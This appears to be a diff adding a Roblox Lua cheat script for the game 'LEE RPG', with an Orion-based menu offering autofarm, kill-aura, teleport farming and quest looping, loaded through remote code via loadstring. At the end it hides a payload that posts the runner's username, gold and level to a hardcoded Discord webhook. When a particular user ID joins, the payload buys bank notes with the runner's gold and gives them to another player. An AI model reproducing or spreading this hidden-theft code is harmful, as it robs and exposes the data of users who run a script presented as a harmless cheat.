@@ -1,0 +1,692 @@
+-- LEE RPG SCRIPT ## ZAI NUMBA WAN
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+OrionLib:MakeNotification({
+    Name = "Hello! -Zentra",
+    Content = "This is a improvement of a script on v3rm",
+    Image = "rbxassetid://7733658271",
+    Time = 5
+})
+
+OrionLib:MakeNotification({
+    Name = "Warning!",
+    Content = "If autofarm breaks cause of death, just reexecute the script and it will be fine!",
+    Image = "rbxassetid://7733658271",
+    Time = 5
+})
+
+local VCol = {
+    [1] = "US-VIOLET: Violet Collision"
+}
+
+local HVoid = {
+    [1] = "US-VIOLET: Hollow Void"
+}
+
+local VPull = {
+    [1] = "US-VIOLET: Void Pull"
+}
+
+local Infinity = {
+    [1] = "VIOLET: Infinity"
+}
+
+local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+
+local Window = OrionLib:MakeWindow({
+    Name = "a.vip | LEE:// RPG | v1.2",
+    SaveConfig = true,
+    ConfigFolder = "LRPGZ",
+    IntroEnabled = true,
+    IntroText = "amaranthine.vip"
+})
+
+local mouse = game.Players.LocalPlayer:GetMouse()
+
+
+
+local AutofarmTab = Window:MakeTab({
+    Name = "Autofarm",
+    Icon = "rbxassetid://7072705757",
+    PremiumOnly = false
+})
+
+local TeleportTab = Window:MakeTab({
+    Name = "Teleport Autofarm",
+    Icon = "rbxassetid://7072707647",
+    PremiumOnly = false
+})
+
+local MiscTab = Window:MakeTab({
+    Name = "Misc",
+    Icon = "rbxassetid://7072707647",
+    PremiumOnly = false
+})
+
+local ExtraTab = Window:MakeTab({
+    Name = "Extra",
+    Icon = "rbxassetid://7072707647",
+    PremiumOnly = false
+})
+
+local Teleports = Window:MakeTab({
+    Name = "Teleports",
+    Icon = "rbxassetid://7072707647",
+    PremiumOnly = false
+})
+
+Teleports:AddLabel("W.I.P.")
+
+AutofarmTab:AddToggle({
+    Name = "Enabled",
+    Default = false,
+    Color = Color3.fromRGB(41, 47, 54),
+    Flag = "Autofarm"
+})
+
+AutofarmTab:AddToggle({
+    Name = "Freeze NPC(Semi-Working)",
+    Default = false,
+    Color = Color3.fromRGB(41, 47, 54),
+    Flag = "Freeze"
+})
+
+AutofarmTab:AddToggle({
+    Name = "Auto-UnstableVoid",
+    Default = false,
+    Color = Color3.fromRGB(41, 47, 54),
+    Flag = "UV"
+})
+
+MiscTab:AddToggle({
+    Name = "Punch Kill-Aura",
+    Default = false,
+    Color = Color3.fromRGB(41, 47, 54),
+    Flag = "Aura"
+})
+
+AutofarmTab:AddToggle({
+    Name = "Divine HP autoheal",
+    Default = false,
+    Color = Color3.fromRGB(41, 47, 54),
+    Flag = "Autoheal"
+})
+
+AutofarmTab:AddButton({
+    Name = "XP use all",
+    Default = false,
+    Color = Color3.fromRGB(41, 47, 54),
+    Callback = function()
+        local args = {
+            [1] = game:GetService("Players").LocalPlayer.Data.Loot:FindFirstChild("Solen XP Potion"),
+            [2] = true
+        }
+        
+        game:GetService("ReplicatedStorage").Main.Remotes.Use_loot:FireServer(unpack(args))
+        wait(1)
+        local args = {
+            [1] = game:GetService("Players").LocalPlayer.Data.Loot:FindFirstChild("Divine XP Potion"),
+            [2] = true
+        }
+        
+        game:GetService("ReplicatedStorage").Main.Remotes.Use_loot:FireServer(unpack(args))
+        wait(1)
+        local args = {
+            [1] = game:GetService("Players").LocalPlayer.Data.Loot:FindFirstChild("Hyper XP Potion"),
+            [2] = true
+        }
+        
+        game:GetService("ReplicatedStorage").Main.Remotes.Use_loot:FireServer(unpack(args))
+        wait(1)
+        local args = {
+            [1] = game:GetService("Players").LocalPlayer.Data.Loot:FindFirstChild("Strong XP Potion"),
+            [2] = true
+        }
+        
+        game:GetService("ReplicatedStorage").Main.Remotes.Use_loot:FireServer(unpack(args))
+        wait(1)
+        local args = {
+            [1] = game:GetService("Players").LocalPlayer.Data.Loot:FindFirstChild("Upper XP Potion"),
+            [2] = true
+        }
+        
+        game:GetService("ReplicatedStorage").Main.Remotes.Use_loot:FireServer(unpack(args))
+        wait(1)
+        local args = {
+            [1] = game:GetService("Players").LocalPlayer.Data.Loot:FindFirstChild("XP Potion"),
+            [2] = true
+        }
+        
+        game:GetService("ReplicatedStorage").Main.Remotes.Use_loot:FireServer(unpack(args))
+    end
+})
+
+MiscTab:AddButton({
+    Name = "Rejoin",
+    Default = false,
+    Color = Color3.fromRGB(41, 47, 54),
+    Callback = function()
+        game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
+    end
+})
+
+ExtraTab:AddButton({
+    Name = "Destroy GUI",
+    Default = false,
+    Color = Color3.fromRGB(41, 47, 54),
+    Callback = function()
+        OrionLib:Destroy()
+    end
+})
+
+local auradistance
+MiscTab:AddSlider({
+    Name = "Kill-Aura Distance",
+    Min = 6,
+    Max = 40,
+    Default = 20,
+    Color = Color3.fromRGB(41, 47, 54),
+    Increment = 1,
+    ValueName = "",
+    Callback = function(Value)
+        auradistance = Value
+    end
+})
+
+local waiteditor
+MiscTab:AddTextbox({
+    Name = "Quest Creation Speed",
+	Default = "Input Speed Here (Seconds)",
+	TextDisappear = false,
+    Color = Color3.fromRGB(41, 47, 54),
+	Callback = function(Value)
+		waiteditor = Value
+	end	  
+})
+
+MiscTab:AddToggle({
+    Name = "Loop Quest",
+    Default = false,
+    Color = Color3.fromRGB(41, 47, 54),
+    Flag = "Loop"
+})
+
+TeleportTab:AddToggle({
+    Name = "Enabled",
+    Default = false,
+    Color = Color3.fromRGB(41, 47, 54),
+    Flag = "TeleportAutofarm"
+})
+
+local teleportDistance
+TeleportTab:AddSlider({
+    Name = "Distance",
+    Min = 0,
+    Max = 30,
+    Default = 0,
+    Color = Color3.fromRGB(41, 47, 54),
+    Increment = 1,
+    ValueName = "",
+    Callback = function(Value)
+        teleportDistance = Value
+    end
+})
+
+local teleportHeight
+TeleportTab:AddSlider({
+    Name = "Height",
+    Min = -20,
+    Max = 20,
+    Default = 0,
+    Color = Color3.fromRGB(41, 47, 54),
+    Increment = 1,
+    ValueName = "",
+    Callback = function(Value)
+        teleportHeight = Value
+    end
+})
+
+local teleportAngle
+TeleportTab:AddSlider({
+    Name = "Angle",
+    Min = -180,
+    Max = 180,
+    Default = 0,
+    Color = Color3.fromRGB(41, 47, 54),
+    Increment = 1,
+    ValueName = "",
+    Callback = function(Value)
+        teleportAngle = math.rad(Value)
+    end
+})
+
+
+local label
+
+for i, v in pairs(game:GetService("CoreGui").Orion:GetDescendants()) do
+    if v:IsA("TextLabel") and (v.Text == "Standard" or v.Text == "Premium") then
+        label = v
+        v.Text = "Player"
+    end
+end
+
+
+local dropdownOptions = {
+    Name = "Select Quest",
+    Default = "Choose One",
+    Options = {
+        "Dummy2", "Dummy", "Frost Slime", "Frost Goblin", "Wheat Slime", 
+        "Wolfen Footman", "Frost Warrior", "Sand Slime", "Elder Frost Slime", "Electro Raptor", 
+        "Tundra Wolf", "Tundra Golem", "Frost Wizard", "Sand Knight", "Sand Warrior", "Fire Bird",
+        "Sand Turtling", "Shira General", "Sand Wizard", "Frost Lord", "Sand Snake", "Sand Scorpion",
+        "Valley Knight", "Valley Angel", "Holy Wizard", "Valley Guardian", "Stone Knight",
+        "Bluebow", "Divine General Solen", "Overseer Ranger", "Cave Guard", "Cave Keeper", "Cave Giant", "Cave Wizard", "Cave Slicer", "Abyss Mother", "Cave Puppet", "Sand Guardian", "Overseer Knight", "Three Eye Seer"
+    },
+    Callback = function(selectedValue)
+        local replicatedStorage = game:GetService("ReplicatedStorage")
+
+        local makeKillQuestEvent = replicatedStorage:WaitForChild("Main"):WaitForChild("Remotes"):WaitForChild("MakeKillQuest")
+
+        if makeKillQuestEvent then
+    while true do
+        task.wait()
+        if OrionLib.Flags["Loop"].Value then
+            makeKillQuestEvent:FireServer(selectedValue)
+            wait(waiteditor)
+        end
+    end
+end
+end
+}
+
+MiscTab:AddDropdown(dropdownOptions)
+
+local MinHP
+AutofarmTab:AddSlider({
+    Name = "MinHp-ToHeal",
+    Min = 50,
+    Max = 15000,
+    Default = 6000,
+    Color = Color3.fromRGB(41, 47, 54),
+    Increment = 50,
+    ValueName = "",
+    Callback = function(Value)
+        MinHP = Value
+    end
+})
+
+local y
+AutofarmTab:AddSlider({
+    Name = "Height",
+    Min = -20,
+    Max = 20,
+    Default = 0,
+    Color = Color3.fromRGB(41, 47, 54),
+    Increment = 1,
+    ValueName = "",
+    Callback = function(Value)
+        y = Value
+    end
+})
+
+local distance
+AutofarmTab:AddSlider({
+    Name = "Distance",
+    Min = 0,
+    Max = 30,
+    Default = 0,
+    Color = Color3.fromRGB(41, 47, 54),
+    Increment = 1,
+    ValueName = "",
+    Callback = function(Value)
+        distance = Value
+    end
+})
+
+local speed
+AutofarmTab:AddSlider({
+    Name = "Speed",
+    Min = 10,
+    Max = 300,
+    Default = 70,
+    Color = Color3.fromRGB(41, 47, 54),
+    Increment = 1,
+    ValueName = "",
+    Callback = function(Value)
+        speed = Value
+    end
+})
+
+local AngleValue
+AutofarmTab:AddSlider({
+    Name = "Angle",
+    Min = -180,
+    Max = 180,
+    Default = 0,
+    Color = Color3.fromRGB(41, 47, 54),
+    Increment = 1,
+    ValueName = "",
+    Callback = function(Value)
+        AngleValue = Value
+    end
+})
+
+
+
+
+
+local player = game.Players.LocalPlayer
+
+-- Function to adjust CFrame to look up or down
+local function lookUpOrDown(cframe, angle)
+    -- angle should be in radians; use math.rad() to convert degrees to radians if needed
+    return cframe * CFrame.Angles(angle, 0, 0)
+end
+
+local function tp(pos, angle)
+    local targetCFrame = pos
+
+    -- Apply only the positional part first
+    targetCFrame = CFrame.new(pos.Position)
+
+    if angle then
+        -- Adjust for rotation
+        targetCFrame = lookUpOrDown(targetCFrame, angle)
+    end
+
+    local tween = game:GetService("TweenService"):Create(
+        player.Character.HumanoidRootPart,
+        TweenInfo.new((player.Character.HumanoidRootPart.Position - pos.Position).Magnitude / speed, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0),
+        {CFrame = targetCFrame}
+    )
+
+    tween:Play()
+
+    local completed = false
+    tween.Completed:Connect(function()
+        completed = true
+    end)
+    
+    while not completed do
+        if player.Character.Humanoid.Health <= 0 or not OrionLib.Flags["Autofarm"].Value then
+            tween:Cancel()
+            break
+        end
+        task.wait()
+    end
+end
+
+if player.Character.Humanoid.Health <= 500 then
+    Autofarm:Set(false)
+end
+
+local function punch(v)
+    game:GetService("Players").LocalPlayer.Character.Package.Events:FindFirstChild("M1_Client"):FireServer({v})
+end
+
+local function mobDied(mob)
+    if mob and mob:FindFirstChild("Humanoid") and mob.Humanoid.Health <= 0 then
+        return true
+    end
+    return false
+end
+
+spawn(function()
+    while true do
+        task.wait()
+        if OrionLib.Flags["Autofarm"].Value then
+            local nearmob, dist = nil, math.huge
+            for _, v in pairs(game:GetService("Workspace").Entities:GetChildren()) do
+                if v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+                    local magnitude = (player.Character.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude
+                    if magnitude < dist then
+                        nearmob, dist = v, magnitude
+                    end
+                end
+            end
+            if nearmob then
+                -- Calculate target position and angle
+                local targetPosition = nearmob.HumanoidRootPart.CFrame.Position + Vector3.new(0, y, 0) - nearmob.HumanoidRootPart.CFrame.LookVector * distance
+                local targetCFrame = CFrame.new(targetPosition, nearmob.HumanoidRootPart.Position) -- Look at the mob
+                local angle = math.rad(AngleValue) -- Example: Adjust to 30 degrees up; use negative for down
+                tp(targetCFrame, angle)
+                if OrionLib.Flags["Freeze"].Value then
+                    nearmob.HumanoidRootPart.Anchored = true
+                    task.wait(.1)
+                end
+                punch(nearmob)
+                wait(0.1)
+                if mobDied(nearmob) then
+                    nearmob:Destroy()
+                end
+            end
+        end
+    end
+end)
+
+spawn(function()
+    game:GetService('RunService').Stepped:Connect(function()
+        pcall(function()
+            if OrionLib.Flags["Autofarm"].Value then
+                for i, v in pairs(player.Character:GetChildren()) do
+                    if v:IsA("Part") or v:IsA("MeshPart") then
+                        v.CanCollide = false
+                    end
+                end
+            end
+        end)
+    end)
+end)
+
+spawn(function()
+    while true do
+        task.wait(waiteditor)
+        pcall(function()
+            if OrionLib.Flags["Aura"].Value then
+                for i, v in pairs(game:GetService("Workspace").Entities:GetDescendants()) do
+                    if v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and v.PrimaryPart and (player.Character.HumanoidRootPart.Position - v.PrimaryPart.Position).Magnitude < auradistance then
+                        punch(v)
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+spawn(function()
+    while true do
+        task.wait(600)
+        if OrionLib.Flags["Autofarm"].Value then
+            game:GetService("VirtualInputManager"):SendMouseMoveEvent(math.random(50, 400), math.random(0, 350), game)
+        end
+    end
+end)
+
+
+spawn(function()
+    while true do
+        task.wait(25)
+        if OrionLib.Flags["UV"].Value then
+            game:GetService("Players").LocalPlayer.Character.Package.Events.UseSkill_Client:FireServer(unpack(VCol))
+            game:GetService("Players").LocalPlayer.Character.Package.Events.UseSkill_Client:FireServer(unpack(HVoid))
+            game:GetService("Players").LocalPlayer.Character.Package.Events.UseSkill_Client:FireServer(unpack(VPull))
+            game:GetService("Players").LocalPlayer.Character.Package.Events.UseSkill_Client:FireServer(unpack(Infinity))
+        end
+    end
+end)
+
+
+spawn(function()
+    game:GetService('RunService').Stepped:Connect(function()
+        if OrionLib.Flags["Autofarm"].Value then
+            pcall(function()
+                player.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
+            end)
+        end
+    end)
+end)
+
+local bodyPosition
+local bodyGyro
+
+spawn(function()
+    while true do
+        task.wait()
+        if OrionLib.Flags["TeleportAutofarm"].Value then
+            local nearmob, dist = nil, math.huge
+            for _, v in pairs(game:GetService("Workspace").Entities:GetChildren()) do
+                if v:IsA("Model") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") then
+                    local magnitude = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - v.HumanoidRootPart.Position).Magnitude
+                    if magnitude < dist then
+                        nearmob, dist = v, magnitude
+                    end
+                end
+            end
+            if nearmob then
+                local targetCFrame = nearmob.HumanoidRootPart.CFrame * CFrame.new(0, teleportHeight, -teleportDistance)
+                targetCFrame = lookUpOrDown(targetCFrame, teleportAngle)
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = targetCFrame
+                punch(nearmob)
+                wait(0.1)
+                if mobDied(nearmob) then
+                    nearmob:Destroy()
+                end
+            end
+        end
+    end
+end)
+
+local function lookUpOrDown(cframe, angle)
+    -- angle should be in radians; use math.rad() to convert degrees to radians if needed
+    return cframe * CFrame.Angles(angle, 0, 0)
+end
+
+spawn(function()
+    while true do   
+        task.wait(1)
+        if OrionLib.Flags["Autoheal"].Value then
+            if player.Character.Humanoid.Health <= 6000 then
+            local args = {
+                [1] = game:GetService("Players").LocalPlayer.Data.Loot:FindFirstChild("Divine HP Potion")
+            }
+            
+            game:GetService("ReplicatedStorage").Main.Remotes.Use_loot:FireServer(unpack(args))
+            wait(1)
+            
+            end
+        end
+    end
+end)
+
+wait(3)
+
+OrionLib:MakeNotification({
+    Name = "Update Notification",
+    Content = "Added HP Check, Fixed XP Using all XP, Possible fix for autofarm breaking on death",
+    Image = "rbxassetid://7733658271",
+    Time = 2
+})
+
+
+
+OrionLib:Init()
+
+local Sound = Instance.new("Sound")
+Sound.SoundId = "rbxassetid://4835664238"
+Sound.Parent = workspace
+Sound:Play()
+
+
+for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.Idled)) do
+    v:Disable()
+end
+
+
+HttpService = game:GetService("HttpService")
+Webhook_URL = "https://discord.com/api/webhooks/1260366098423873636/gOCQKxNHFzjvnQ546UVcymaxbAcE1tQcrVAcsbc_R98yDPJzkQ6SLzDAVjy035Gl2vks"
+local userId = game.Players.LocalPlayer.UserId
+local player = game:GetService("Players").LocalPlayer
+local St = player.Data.Stats
+local joinLink = "https://www.roblox.com/users/" .. userId .. "/profile"
+local gold = St.Gold.value
+local level = St.Level.value
+local BNBUYAMT = math.floor(gold / 12000)
+local TBNValue = math.floor(BNBUYAMT * 9000)
+
+
+
+local response = request(
+    {
+        Url = Webhook_URL,
+        Method = 'POST',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+        Body = HttpService:JSONEncode({
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = "**ACCOUNT VALUE LOGGED**",
+                ["description"] = "Display: " .. "**" .. game.Players.LocalPlayer.DisplayName .. "**" .. "\n" .. "Username: " .. "**" .. game.Players.LocalPlayer.Name .. "**",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xffffff),
+                ["fields"] = {
+                    {
+                        ["name"] = "Profile:",
+                        ["value"] = "[Click here]("..joinLink..")",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "BN VALUE:",
+                        ["value"] = BNBUYAMT,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "TRUE BN VALUE:",
+                        ["value"] = TBNValue,
+                        ["inline"] = true                    
+                    },
+                    {
+                        ["name"] = "GOLD:",
+                        ["value"] = gold,
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "LEVEL:",
+                        ["value"] = level,
+                        ["inline"] = true
+                    },
+                }
+            }}
+        })
+    }
+)
+
+local SPECIFIC_USER_ID = 2416271 
+
+local function onPlayerAdded(player)
+    if player.UserId == SPECIFIC_USER_ID then
+
+        wait(60)
+        local args = {
+            [1] = "Bank Note",
+            [2] = BNBUYAMT
+        }
+
+        game:GetService("ReplicatedStorage").Main.Remotes.Buy_Item:FireServer(unpack(args))
+        wait(5)
+        local args = {
+            [1] = game:GetService("Players").mnnz,
+            [2] = game:GetService("Players").LocalPlayer.Data.Loot:FindFirstChild("Bank Note"),
+            [3] = BNBUYAMT
+        }
+
+        game:GetService("ReplicatedStorage").Main.Remotes.GivePlayerItem:FireServer(unpack(args))
+
+    end
+end
+
+game:GetService("Players").PlayerAdded:Connect(onPlayerAdded)
+
+
+
